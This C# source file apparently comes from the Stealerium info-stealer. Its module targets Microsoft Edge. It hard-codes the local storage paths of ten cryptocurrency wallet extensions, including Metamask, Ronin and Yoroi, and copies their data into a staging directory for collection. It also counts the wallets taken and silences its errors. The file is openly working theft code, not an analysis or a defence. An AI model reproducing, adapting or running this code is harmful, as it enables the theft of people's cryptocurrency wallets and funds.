using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Edge
{
    internal class Extensions
    {
        private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
        {
            new[]
            {
                "Edge_Auvitas",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"
            },
            new[]
            {
                "Edge_Math",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"
            },
            new[]
            {
                "Edge_Metamask",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
            },
            new[]
            {
                "Edge_MTV",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"
            },
            new[]
            {
                "Edge_Rabet",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"
            },
            new[]
            {
                "Edge_Ronin",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"
            },
            new[]
            {
                "Edge_Yoroi",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"
            },
            new[]
            {
                "Edge_Zilpay",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"
            },
            new[]
            {
                "Edge_Terra_Station",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
            },
            new[]
            {
                "Edge_Jaxx",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"
            }
        };

        public static void GetEdgeWallets(string sSaveDir)
        {
            try
            {
                int walletsCopied = 0;

                foreach (var array in EdgeWalletsDirectories)
                {
                    walletsCopied += CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]) ? 1 : 0;
                }

                // If no wallets were copied, delete the save directory if it exists
                if (walletsCopied == 0)
                {
                    Filemanager.RecursiveDelete(sSaveDir);
                    Logging.Log("No wallets found in Edge extensions.");
                }
            }
            catch (Exception)
            {
                //
            }
        }

        // Copy wallet files to directory
        private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
        {
            try
            {
                if (!Directory.Exists(walletDirectory))
                {
                    return false;
                }

                // Create saveDirectory if it doesn't exist
                if (!Directory.Exists(saveDirectory))
                {
                    Directory.CreateDirectory(saveDirectory);
                }

                var destinationDirectory = Path.Combine(saveDirectory, walletName);
                Directory.CreateDirectory(destinationDirectory);
                Filemanager.CopyDirectory(walletDirectory, destinationDirectory);
                Counter.BrowserWallets++;

                Logging.Log($"Copied wallet: {walletName} to {destinationDirectory}");
                return true;
            }
            catch (Exception ex)
            {
                Logging.Log($"Error copying wallet {walletName}: {ex.Message}");
                return false;
            }
        }
    }
}